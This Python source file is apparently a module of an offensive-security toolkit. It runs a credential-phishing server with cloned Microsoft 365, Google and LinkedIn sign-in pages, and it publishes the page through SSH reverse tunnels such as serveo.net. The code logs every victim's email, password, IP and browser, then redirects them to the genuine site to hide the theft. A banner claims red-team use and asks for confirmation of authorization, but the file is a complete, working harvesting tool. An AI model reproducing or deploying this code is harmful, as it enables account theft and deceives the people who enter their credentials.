# -*- coding: utf-8 -*-
"""
MEOW-SEC :: PHISH — Phishing Page + Tunnel (no port forwarding needed)
  · Templates : Microsoft 365, Google, LinkedIn, Generic, Custom HTML
  · Tunnel via serveo.net / localhost.run / bore.pub  (SSH, no install)
  · Capture automatique des credentials dans data/phish_*.log
  · Redirect post-capture vers la vraie page

LEGAL: Authorized red team / phishing simulations ONLY.
       Unauthorized phishing is illegal in all jurisdictions.
"""
import os, json, re, subprocess, threading, time, socket, random, string
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

from core.ui import (console, ok, err, info, warn, find,
                     show_module_banner, ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_FOUND, CAT_PWNED
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.prompt  import Prompt, Confirm
from rich.rule    import Rule
from rich         import box

# ─── TEMPLATES ───────────────────────────────────────────────

TEMPLATES = {
    "microsoft": {
        "name":     "Microsoft 365",
        "redirect": "https://login.microsoftonline.com",
        "color":    "#0078d4",
        "logo":     "Microsoft",
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in to your account</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}}
body{{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;padding:44px 44px 36px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}}
.logo{{font-size:1.4rem;font-weight:600;color:#1b1b1b;margin-bottom:24px}}
h2{{font-size:1.5rem;font-weight:400;color:#1b1b1b;margin-bottom:8px}}
p{{color:#605e5c;font-size:.875rem;margin-bottom:24px}}
input{{width:100%;border:1px solid #8a8886;padding:8px 10px;font-size:.9rem;margin-bottom:16px;outline:none}}
input:focus{{border-color:#0078d4;border-width:2px}}
.btn{{background:#0078d4;color:#fff;border:none;width:100%;padding:10px;font-size:1rem;cursor:pointer}}
.btn:hover{{background:#005a9e}}
.footer{{margin-top:16px;font-size:.75rem;color:#605e5c;text-align:center}}
</style></head><body>
<div class="card">
  <div class="logo">&#11036; Microsoft</div>
  <h2>Sign in</h2>
  <p>Use your Microsoft account</p>
  <form method="POST" action="/capture">
    <input name="email" type="email" placeholder="Email, phone, or Skype" required>
    <input name="password" type="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
  <div class="footer"><a href="#">Can't access your account?</a></div>
</div></body></html>""",
    },
    "google": {
        "name":     "Google",
        "redirect": "https://accounts.google.com",
        "color":    "#4285f4",
        "logo":     "Google",
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in – Google accounts</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,sans-serif}}
body{{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:450px}}
.logo{{font-size:2rem;color:#5f6368;margin-bottom:24px;text-align:center}}
h2{{text-align:center;font-size:1.5rem;color:#202124;margin-bottom:8px}}
p{{text-align:center;color:#5f6368;font-size:.875rem;margin-bottom:24px}}
.field{{position:relative;margin-bottom:24px}}
label{{font-size:.75rem;color:#5f6368;display:block;margin-bottom:4px}}
input{{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:1rem;outline:none}}
input:focus{{border-color:#1a73e8;border-width:2px}}
.btn{{background:#1a73e8;color:#fff;border:none;border-radius:4px;width:100%;padding:10px;font-size:.875rem;cursor:pointer}}
.btn:hover{{background:#1557b0}}
.footer{{margin-top:24px;text-align:right}}
</style></head><body>
<div class="card">
  <div class="logo"><b style="color:#4285f4">G</b><b style="color:#ea4335">o</b><b style="color:#fbbc05">o</b><b style="color:#4285f4">g</b><b style="color:#34a853">l</b><b style="color:#ea4335">e</b></div>
  <h2>Sign in</h2>
  <p>Use your Google Account</p>
  <form method="POST" action="/capture">
    <div class="field"><label>Email or phone</label><input name="email" type="email" required></div>
    <div class="field"><label>Password</label><input name="password" type="password" required></div>
    <div class="footer"><button class="btn" type="submit">Next</button></div>
  </form>
</div></body></html>""",
    },
    "linkedin": {
        "name":     "LinkedIn",
        "redirect": "https://www.linkedin.com",
        "color":    "#0a66c2",
        "logo":     "LinkedIn",
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>LinkedIn: Log In or Sign Up</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}}
body{{background:#f3f2ef;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding-top:40px}}
.brand{{font-size:2rem;font-weight:700;color:#0a66c2;margin-bottom:24px}}
.card{{background:#fff;border-radius:8px;padding:24px;width:400px;box-shadow:0 4px 12px rgba(0,0,0,.15)}}
h2{{font-size:1.5rem;margin-bottom:20px;color:#000}}
label{{font-size:.875rem;color:#666;display:block;margin-bottom:4px}}
input{{width:100%;border:1px solid #ccc;border-radius:4px;padding:12px;font-size:1rem;margin-bottom:16px;outline:none}}
input:focus{{border-color:#0a66c2}}
.btn{{background:#0a66c2;color:#fff;border:none;border-radius:24px;width:100%;padding:14px;font-size:1rem;font-weight:600;cursor:pointer}}
.btn:hover{{background:#004182}}
</style></head><body>
<div class="brand">in LinkedIn</div>
<div class="card">
  <h2>Sign in</h2>
  <form method="POST" action="/capture">
    <label>Email or phone</label>
    <input name="email" type="text" required>
    <label>Password</label>
    <input name="password" type="password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
</div></body></html>""",
    },
    "generic": {
        "name":     "Generic Login",
        "redirect": "https://example.com",
        "color":    "#00ff41",
        "logo":     "Portal",
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Secure Login Portal</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}}
body{{background:#0a0f0a;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#0d1a0d;border:1px solid #00ff41;padding:40px;width:420px}}
.logo{{color:#00ff41;font-size:1.2rem;margin-bottom:24px;text-align:center}}
h2{{color:#00ff41;text-align:center;margin-bottom:24px;font-size:1rem;letter-spacing:.2em}}
label{{color:#00e5ff;font-size:.8rem;display:block;margin-bottom:6px}}
input{{width:100%;background:#0a0f0a;border:1px solid #00ff41;color:#00ff41;padding:10px;font-size:.9rem;margin-bottom:18px;outline:none;font-family:inherit}}
input:focus{{border-color:#00e5ff}}
.btn{{background:#00ff41;color:#0a0f0a;border:none;width:100%;padding:12px;font-size:.9rem;font-weight:700;cursor:pointer;letter-spacing:.1em}}
.status{{color:#00e5ff;font-size:.75rem;text-align:center;margin-top:12px}}
</style></head><body>
<div class="card">
  <div class="logo">[ SECURE PORTAL ]</div>
  <h2>AUTHENTICATION REQUIRED</h2>
  <form method="POST" action="/capture">
    <label>USERNAME / EMAIL</label>
    <input name="email" type="text" required>
    <label>PASSWORD</label>
    <input name="password" type="password" required>
    <button class="btn" type="submit">AUTHENTICATE</button>
  </form>
  <div class="status">🔒 256-bit encrypted</div>
</div></body></html>""",
    },
}

# ─── SERVER ──────────────────────────────────────────────────

_creds_log:  list  = []
_redirect:   str   = "https://example.com"
_custom_html: str  = ""

class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # silence default access log

    def _send(self, code: int, body: str, ct: str = "text/html"):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", f"{ct}; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self._send(200, _custom_html)
        elif self.path == "/favicon.ico":
            self._send(404, "")
        else:
            self._send(200, _custom_html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode(errors="replace")
        params = parse_qs(body)
        email  = params.get("email",    [""])[0]
        passwd = params.get("password", [""])[0]
        ip     = self.client_address[0]
        ua     = self.headers.get("User-Agent","?")[:80]

        entry = {
            "time":     datetime.now().isoformat(),
            "ip":       ip,
            "email":    email,
            "password": passwd,
            "ua":       ua,
        }
        _creds_log.append(entry)
        _save_log(entry)
        find(f"[{RD}]CAPTURE[/]  [{CY}]{email}[/]  [{OR}]{passwd}[/]  from [{DM}]{ip}[/]")

        # Redirect to real site
        redir_html = f"""<!DOCTYPE html><html><head>
<meta http-equiv="refresh" content="0;url={_redirect}">
</head><body><p>Redirecting...</p></body></html>"""
        self._send(200, redir_html)

def _save_log(entry: dict):
    os.makedirs("data", exist_ok=True)
    logfile = f"data/phish_{datetime.now().strftime('%Y%m%d')}.log"
    with open(logfile, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")

# ─── TUNNEL ──────────────────────────────────────────────────

TUNNELS = {
    "serveo":      ("serveo.net",       "ssh -R 80:localhost:{port} serveo.net -o StrictHostKeyChecking=no"),
    "localhostrun": ("localhost.run",    "ssh -R 80:localhost:{port} nokey@localhost.run -o StrictHostKeyChecking=no"),
    "bore":        ("bore.pub",         "bore local {port} --to bore.pub"),
}

def _start_tunnel(kind: str, port: int) -> subprocess.Popen | None:
    if kind not in TUNNELS:
        return None
    name, cmd_tmpl = TUNNELS[kind]
    cmd = cmd_tmpl.format(port=port)
    info(f"Starting tunnel via [{CY}]{name}[/]...")
    info(f"  [{DM}]CMD: {cmd}[/]")
    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        return proc
    except Exception as e:
        err(f"Tunnel launch failed: {e}")
        return None

def _read_tunnel_url(proc: subprocess.Popen, timeout: int = 15) -> str:
    """Lis la sortie du process tunnel pour trouver l'URL publique"""
    url_pattern = re.compile(r"https?://[a-zA-Z0-9._\-]+(?:\.\w+)+(?:/\S*)?")
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.2)
            continue
        line = line.strip()
        if line:
            console.print(f"  [{DM}][tunnel] {line}[/]")
        m = url_pattern.search(line)
        if m:
            return m.group(0)
    return ""

# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("phish")
    cat_talk(CAT_PWNED,
             "PHISH tunnel loaded — authorized red team use ONLY.", OR)
    console.print()

    warn("This module is for authorized phishing simulations only.")
    warn("Unauthorized phishing is ILLEGAL in all jurisdictions.")
    console.print()
    if not Confirm.ask(f"  [{OR}]I have explicit written authorization for this target[/]",
                       default=False):
        info("Aborted."); return

    console.print()

    # ── Choose template ─────────────────────────────────────────
    console.print(Rule(f"[{CY}] TEMPLATE ", style=G2))
    console.print(f"  [{G1}][1][/] Microsoft 365")
    console.print(f"  [{G1}][2][/] Google")
    console.print(f"  [{G1}][3][/] LinkedIn")
    console.print(f"  [{G1}][4][/] Generic portal")
    console.print(f"  [{G1}][5][/] Custom HTML file")
    tmpl_choice = ask_choice("Template", "1")

    global _custom_html, _redirect
    if tmpl_choice == "5":
        path = Prompt.ask(f"  [{G1}]◈ HTML file path[/]").strip()
        if not os.path.isfile(path):
            err(f"File not found: {path}"); return
        with open(path, encoding="utf-8") as fh:
            _custom_html = fh.read()
        _redirect = Prompt.ask(f"  [{G1}]◈ Redirect URL after capture[/]",
                               default="https://example.com").strip()
    else:
        key = {"1":"microsoft","2":"google","3":"linkedin","4":"generic"}.get(tmpl_choice,"generic")
        tmpl = TEMPLATES[key]
        _custom_html = tmpl["html"]
        _redirect    = tmpl["redirect"]
        ok(f"Template: [{CY}]{tmpl['name']}[/]  → redirect: {_redirect}")

    # ── Port ────────────────────────────────────────────────────
    console.print()
    port_s = Prompt.ask(f"  [{G1}]◈ Local port[/]", default="8080").strip()
    port   = int(port_s) if port_s.isdigit() else 8080

    # ── Tunnel service ──────────────────────────────────────────
    console.print()
    console.print(Rule(f"[{CY}] TUNNEL ", style=G2))
    console.print(f"  [{G1}][1][/] serveo.net       (SSH, no install)")
    console.print(f"  [{G1}][2][/] localhost.run    (SSH, no install)")
    console.print(f"  [{G1}][3][/] bore.pub         (requires: pip install bore / cargo install bore-cli)")
    console.print(f"  [{G1}][4][/] No tunnel        (LAN only — http://YOUR_IP:{port})")
    tunnel_choice = ask_choice("Tunnel", "1")

    tunnel_keys  = {"1":"serveo","2":"localhostrun","3":"bore"}
    tunnel_key   = tunnel_keys.get(tunnel_choice)

    # ── Start HTTP server ───────────────────────────────────────
    console.print()
    info(f"Starting phishing server on [{CY}]0.0.0.0:{port}[/]...")
    try:
        server = HTTPServer(("0.0.0.0", port), PhishHandler)
    except OSError as e:
        err(f"Cannot bind port {port}: {e}"); return

    srv_thread = threading.Thread(target=server.serve_forever, daemon=True)
    srv_thread.start()
    ok(f"Server running on port [{G1}]{port}[/]")

    # ── Start tunnel ────────────────────────────────────────────
    public_url = ""
    tunnel_proc = None
    if tunnel_key:
        tunnel_proc = _start_tunnel(tunnel_key, port)
        if tunnel_proc:
            info(f"Waiting for tunnel URL (up to 20s)...")
            public_url = _read_tunnel_url(tunnel_proc, timeout=20)
            if public_url:
                find(f"Public URL: [{G1}]{public_url}[/]")
                console.print()
                console.print(Panel(
                    f"[bold {G1}]{public_url}[/]",
                    title=f"[{CY}]◈ PHISHING LINK ◈",
                    border_style=RD, padding=(1,4)
                ))
            else:
                warn("Could not parse public URL from tunnel output.")
                warn("Check tunnel output above for the URL manually.")
    else:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            local_ip = "127.0.0.1"
        public_url = f"http://{local_ip}:{port}"
        find(f"LAN URL: [{G1}]{public_url}[/]")

    # ── Live capture monitor ─────────────────────────────────────
    console.print()
    console.print(Rule(f"[{RD}] CAPTURE LOG — Ctrl+C to stop ", style=RD))
    info("Waiting for victims... Press Ctrl+C to stop.\n")

    cap_count = 0
    logfile = f"data/phish_{datetime.now().strftime('%Y%m%d')}.log"
    try:
        while True:
            time.sleep(1)
            current = len(_creds_log)
            if current > cap_count:
                for entry in _creds_log[cap_count:]:
                    t = Table(box=box.SIMPLE, show_edge=False, show_header=False, padding=(0,2))
                    t.add_column("k", style=DM, width=10)
                    t.add_column("v", style=G1)
                    t.add_row("Time",     entry["time"])
                    t.add_row("IP",       entry["ip"])
                    t.add_row("Email",    f"[bold {CY}]{entry['email']}[/]")
                    t.add_row("Password", f"[bold {RD}]{entry['password']}[/]")
                    t.add_row("UA",       entry["ua"][:60])
                    console.print(Panel(t, title=f"[{RD}]◈ CREDENTIAL CAPTURED ◈",
                                        border_style=RD))
                cap_count = current

    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        if tunnel_proc:
            tunnel_proc.terminate()

    console.print()
    ok(f"Session ended. [{G1}]{cap_count}[/] credential(s) captured.")
    if cap_count:
        ok(f"Log saved: [{CY}]{logfile}[/]")
        _show_summary()

def _show_summary():
    if not _creds_log:
        return
    console.print()
    console.print(Rule(f"[{G1}] CAPTURED CREDENTIALS ", style=G2))
    rows = [(e["time"][:19], e["ip"], e["email"], e["password"][:20])
            for e in _creds_log]
    from core.ui import print_result_table
    print_result_table("Phishing Results",
                       ["Time","IP","Email","Password (truncated)"], rows)
